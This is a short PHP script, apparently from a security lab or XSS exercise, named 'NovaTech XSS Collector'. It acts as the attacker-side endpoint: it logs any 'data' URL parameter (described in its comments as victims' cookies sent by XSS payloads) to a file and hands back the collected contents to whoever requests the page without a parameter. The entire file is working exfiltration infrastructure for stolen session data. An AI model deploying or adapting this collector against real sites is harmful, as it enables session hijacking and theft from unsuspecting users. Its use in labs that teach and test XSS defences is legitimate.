<?php
// NovaTech XSS Collector
// Simulates the attacker-controlled endpoint that receives stolen data.
// XSS payloads redirect victims here with their cookies as a URL parameter.

$collected_file = '/var/www/data/collected.txt';

if (isset($_GET['data'])) {
    file_put_contents($collected_file, urldecode($_GET['data']) . "\n", FILE_APPEND);
    http_response_code(204);
    exit;
}

// No parameter — return whatever was collected
header('Content-Type: text/plain');
$data = @file_get_contents($collected_file);
echo $data ?: "No data collected yet.\n";
